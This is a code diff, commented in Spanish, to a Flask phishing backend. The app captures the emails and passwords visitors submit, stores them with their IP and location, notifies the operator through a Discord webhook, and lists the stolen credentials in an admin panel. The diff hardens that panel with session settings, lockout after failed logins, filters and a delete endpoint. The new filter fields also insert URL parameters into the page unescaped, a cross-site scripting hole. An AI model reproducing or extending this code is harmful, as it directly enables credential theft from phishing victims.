@@ -14,8 +14,15 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-# Usar variable de entorno para la clave secreta (más seguro)
+
+# Configuración de seguridad de sesión
 app.secret_key = os.environ.get('SECRET_KEY', 'clave-secreta-para-session-12345')
+app.config.update(
+    SESSION_COOKIE_SECURE=True,  # Solo HTTPS
+    SESSION_COOKIE_HTTPONLY=True,  # No accesible por JavaScript
+    SESSION_COOKIE_SAMESITE='Lax',  # Protección CSRF
+    PERMANENT_SESSION_LIFETIME=timedelta(hours=2)  # Sesión expira en 2 horas
+)
 
 # Config
 CONFIG = {
@@ -30,8 +37,21 @@ CONFIG = {
     'cleanup_days': 30  # Días para eliminar credenciales antiguas
 }
 
-# Almacenar intentos de login por IP
+# Almacenar intentos de login por IP (con timestamp para bloqueo temporal)
 login_attempts = {}
+
+def is_ip_blocked(ip):
+    """Verifica si una IP está bloqueada y si ya pasó el tiempo de bloqueo"""
+    if ip in login_attempts:
+        attempts, block_time = login_attempts[ip]
+        if attempts >= CONFIG.get('max_login_attempts', 5):
+            # Bloqueo de 5 minutos
+            if datetime.now() - block_time < timedelta(minutes=5):
+                return True
+            else:
+                # Resetear después de 5 minutos
+                del login_attempts[ip]
+    return False
 
 def load_config():
     try:
@@ -61,6 +81,10 @@ def init_db():
                 viewed INTEGER DEFAULT 0
             )
         ''')
+        # Crear índices para mejorar el rendimiento
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON credentials(timestamp)')
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_ip ON credentials(ip)')
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_username ON credentials(username)')
         conn.commit()
         conn.close()
         logger.info("Base de datos inicializada correctamente")
@@ -108,6 +132,13 @@ def is_social_crawler(ua):
     social_bots = ['facebookexternalhit', 'twitterbot', 'whatsapp', 'linkedinbot', 
                    'telegrambot', 'discord', 'slackbot', 'pinterest', 'redditbot']
     return any(bot in ua.lower() for bot in social_bots)
+
+def validate_input(text):
+    """Valida que el input no contenga caracteres peligrosos"""
+    if text:
+        # Solo letras, números, @, ., -, _ y espacios
+        return re.match(r'^[a-zA-Z0-9@.\-_\s]+$', text) is not None
+    return True
 
 def send_notifications(data):
     if CONFIG.get('discord_webhook'):
@@ -308,8 +339,13 @@ def capture():
     ip = get_client_ip()
     geo = get_geo(ip)
     
-    username = request.form.get('email') or request.form.get('username', '')
+    username = request.form.get('email', '') or request.form.get('username', '')
     password = request.form.get('password', '')
+    
+    # Validar entrada para prevenir inyecciones
+    if not validate_input(username):
+        logger.warning(f"Intento de inyección detectado desde {ip}")
+        username = re.sub(r'[^a-zA-Z0-9@.\-_\s]', '', username)
     
     hash_str = hashlib.md5(f"{ip}:{username}:{password}".encode()).hexdigest()
     
@@ -346,8 +382,8 @@ def login_credenciales():
     ip = get_client_ip()
     max_attempts = CONFIG.get('max_login_attempts', 5)
     
-    # Verificar si la IP ha superado el límite de intentos
-    if ip in login_attempts and login_attempts[ip] >= max_attempts:
+    # Verificar si la IP está bloqueada (con tiempo de expiración)
+    if is_ip_blocked(ip):
         return render_template_string('''
         <!DOCTYPE html>
         <html>
@@ -362,7 +398,7 @@ def login_credenciales():
         <body>
             <div class="container">
                 <h1>🚫 Acceso Bloqueado</h1>
-                <p>Has superado el límite de intentos permitidos ({max_attempts}).</p>
+                <p>Has superado el límite de intentos permitidos.</p>
                 <p class="error">Espera 5 minutos para volver a intentarlo.</p>
             </div>
         </body>
@@ -375,14 +411,17 @@ def login_credenciales():
             # Login exitoso, resetear intentos
             login_attempts.pop(ip, None)
             session['admin_logged'] = True
-            session.permanent = True  # Sesión persistente
+            session.permanent = True
             logger.info(f"Login exitoso desde IP {ip}")
             return redirect('/ver-credenciales')
         else:
-            # Incrementar intentos fallidos
-            login_attempts[ip] = login_attempts.get(ip, 0) + 1
-            remaining = max_attempts - login_attempts[ip]
-            logger.warning(f"Login fallido desde IP {ip}, intentos: {login_attempts[ip]}")
+            # Incrementar intentos fallidos con timestamp
+            if ip not in login_attempts:
+                login_attempts[ip] = [0, datetime.now()]
+            login_attempts[ip][0] += 1
+            login_attempts[ip][1] = datetime.now()
+            remaining = max_attempts - login_attempts[ip][0]
+            logger.warning(f"Login fallido desde IP {ip}, intentos: {login_attempts[ip][0]}")
             
             return render_template_string('''
             <!DOCTYPE html>
@@ -443,10 +482,30 @@ def ver_credenciales():
     if not session.get('admin_logged'):
         return redirect('/login-credenciales')
     
+    # Obtener filtros de la URL
+    filter_ip = request.args.get('ip', '')
+    filter_username = request.args.get('username', '')
+    filter_location = request.args.get('location', '')
+    
+    query = 'SELECT id, timestamp, ip, username, password, geo_location FROM credentials WHERE 1=1'
+    params = []
+    
+    if filter_ip:
+        query += ' AND ip LIKE ?'
+        params.append(f'%{filter_ip}%')
+    if filter_username:
+        query += ' AND username LIKE ?'
+        params.append(f'%{filter_username}%')
+    if filter_location:
+        query += ' AND geo_location LIKE ?'
+        params.append(f'%{filter_location}%')
+    
+    query += ' ORDER BY id DESC'
+    
     try:
         conn = sqlite3.connect('credentials.db', check_same_thread=False)
         cursor = conn.cursor()
-        cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
+        cursor.execute(query, params)
         rows = cursor.fetchall()
         conn.close()
     except Exception as e:
@@ -456,6 +515,7 @@ def ver_credenciales():
     if not rows:
         return "<h1>📭 No hay credenciales capturadas aún</h1>"
     
+    # Construir HTML con filtros y tabla
     html = """
     <!DOCTYPE html>
     <html>
@@ -464,19 +524,40 @@ def ver_credenciales():
         <style>
             body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }
             h1 { color: #1a73e8; text-align: center; }
-            .logout { float: right; background: #dc3545; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; }
+            .logout { float: right; background: #dc3545; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; margin-left: 10px; }
             .logout:hover { background: #c82333; }
+            .filters { background: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+            .filters input { padding: 8px; margin: 5px; border: 1px solid #ddd; border-radius: 4px; width: 200px; }
+            .filters button { padding: 8px 16px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
+            .filters button:hover { background: #1557b0; }
+            .filters .clear { background: #6c757d; }
+            .filters .clear:hover { background: #5a6268; }
             table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
             th { background: #1a73e8; color: white; padding: 12px; text-align: left; }
             td { padding: 10px; border-bottom: 1px solid #ddd; }
             tr:hover { background: #f5f5f5; }
             .badge { background: #4CAF50; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; }
+            .delete-btn { background: #dc3545; color: white; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 12px; }
+            .delete-btn:hover { background: #c82333; }
         </style>
     </head>
     <body>
-        <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
+        <div style="display: flex; justify-content: flex-end;">
+            <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
+        </div>
         <h1>🔐 Credenciales Capturadas</h1>
         <p style="text-align:center; color:#666;">Total: <strong>"""+str(len(rows))+"""</strong></p>
+        
+        <div class="filters">
+            <form method="GET" style="display: flex; flex-wrap: wrap; align-items: center; gap: 10px;">
+                <input type="text" name="ip" placeholder="Filtrar por IP" value="""+request.args.get('ip', '')+""">
+                <input type="text" name="username" placeholder="Filtrar por usuario" value="""+request.args.get('username', '')+""">
+                <input type="text" name="location" placeholder="Filtrar por ubicación" value="""+request.args.get('location', '')+""">
+                <button type="submit">🔍 Filtrar</button>
+                <a href="/ver-credenciales" class="clear" style="padding: 8px 16px; background: #6c757d; color: white; border: none; border-radius: 4px; text-decoration: none;">❌ Limpiar</a>
+            </form>
+        </div>
+        
         <table>
             <tr>
                 <th>#</th>
@@ -485,6 +566,7 @@ def ver_credenciales():
                 <th>Ubicación</th>
                 <th>Usuario</th>
                 <th>Contraseña</th>
+                <th>Acción</th>
             </tr>
     """
     
@@ -497,6 +579,12 @@ def ver_credenciales():
                 <td>{r[5]}</td>
                 <td><strong>{r[3]}</strong></td>
                 <td><span class="badge">{r[4]}</span></td>
+                <td>
+                    <form action="/api/credentials/{r[0]}" method="POST" style="display:inline;">
+                        <input type="hidden" name="_method" value="DELETE">
+                        <button type="submit" class="delete-btn" onclick="return confirm('¿Eliminar esta credencial?')">🗑️</button>
+                    </form>
+                </td>
             </tr>
         """
     
@@ -509,6 +597,29 @@ def ver_credenciales():
     </html>
     """
     return html
+
+@app.route('/api/credentials/<int:credential_id>', methods=['DELETE', 'POST'])
+def delete_credential(credential_id):
+    """Eliminar una credencial específica"""
+    if not session.get('admin_logged'):
+        return jsonify({'error': 'No autorizado'}), 401
+    
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('DELETE FROM credentials WHERE id = ?', (credential_id,))
+        conn.commit()
+        deleted = cursor.rowcount
+        conn.close()
+        
+        if deleted:
+            logger.info(f"Credencial {credential_id} eliminada")
+            return jsonify({'success': True, 'message': 'Credencial eliminada'})
+        else:
+            return jsonify({'success': False, 'message': 'Credencial no encontrada'}), 404
+    except Exception as e:
+        logger.error(f"Error al eliminar credencial: {e}")
+        return jsonify({'error': 'Error interno'}), 500
 
 @app.route('/logout-credenciales')
 def logout_credenciales():
@@ -531,7 +642,7 @@ def api_credentials():
         cursor.execute('UPDATE credentials SET viewed = 1 WHERE viewed = 0')
         conn.commit()
         conn.close()
-        logger.info(f"API /credentials consultada exitosamente")
+        logger.info("API /credentials consultada exitosamente")
     except Exception as e:
         logger.error(f"Error en API /credentials: {e}")
         return jsonify({'error': 'Error interno'}), 500
@@ -554,7 +665,7 @@ def stats():
         cursor.execute('SELECT COUNT(*), COUNT(DISTINCT ip), COUNT(CASE WHEN viewed=0 THEN 1 END) FROM credentials')
         total, unique, new = cursor.fetchone()
         conn.close()
-        logger.info(f"API /stats consultada exitosamente")
+        logger.info("API /stats consultada exitosamente")
     except Exception as e:
         logger.error(f"Error en API /stats: {e}")
         return jsonify({'error': 'Error interno'}), 500
